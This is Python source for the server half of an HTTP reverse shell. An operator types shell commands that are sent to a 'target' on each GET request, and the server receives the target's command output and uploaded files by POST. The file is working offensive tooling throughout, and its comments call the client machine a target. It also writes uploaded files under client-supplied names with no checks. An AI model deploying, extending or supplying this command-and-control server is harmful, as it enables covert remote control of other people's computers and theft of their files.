from http.server import BaseHTTPRequestHandler    # SimpleHTTPRequestHandler
from socketserver import TCPServer
import os
from cgi import parse_header, FieldStorage

class ServerHandler(BaseHTTPRequestHandler): 
    # ServerHandler defines what we should do when we receive a GET/POST request
    # from the client / target
    def do_GET(self):
        # on GET request 
        command = input("Shell> ")
        # return HTML status 200 (OK)
        self.send_response(200)
        # Inform the target that content type header is "text/html"
        self.send_header("Content-type", "text/html")
        self.end_headers() 
        # send the command which we got from the user input
        self.wfile.write(command.encode())

    def do_POST(self):
        # on POST request 
        if self.path == '/store':
            try:
                
                ctype, pdict = parse_header(self.headers.get('content-type'))
                if ctype == 'multipart/form-data':
                    fs = FieldStorage( fp = self.rfile, headers = self.headers, environ={ 'REQUEST_METHOD':'POST' } )
                else:
                    print ("[!] Unexpected POST request")

                # on the client side we submitted the file,
                # Now here to retrieve the actual file, we use the corresponding key 'file'
                fs_up = fs['file']
                filename = fs['filename'].value
                # create a file holder called '1.txt' and write the received file into this '1.txt'
                with open(filename, 'wb') as o:  
                    o.write( fs_up.file.read() )
                    self.send_response(200)
                    self.end_headers()
            except Exception as e:
                print(e)
            # once we store the received file, exit the function
            return 
        # return HTML status 200 (OK)
        self.send_response(200)
        self.end_headers()
        # Define the length of bytes HTTP POST data contains, value must be integer
        length = int(self.headers['Content-Length'])
        # Read then print the posted data
        post_value = self.rfile.read(length).decode()
        print(post_value)

class WebServer():
    def __init__(self, port=5000, verbose=True):
        """ Constructs a restartable WebServer on 'PORT'. """
        self.IP = '<SERVER-IP-ADDRESS>'
        self.PORT = port
        self._verbose = verbose
        self._handler = ServerHandler

    def run(self):
        """ Serve forever, restart when allowed. """
        with TCPServer((self.IP, self.PORT), self._handler) as httpd:
            if self._verbose:
                print('[ WEB SERVER ] Serving at port:', self.PORT)
            try:
                httpd.serve_forever()
            except KeyboardInterrupt:
                httpd.server_close()
                print('[ WEB SERVER ] Closing connection.')

def main():
    w = WebServer()
    w.run()
  

if __name__ == "__main__":
    main()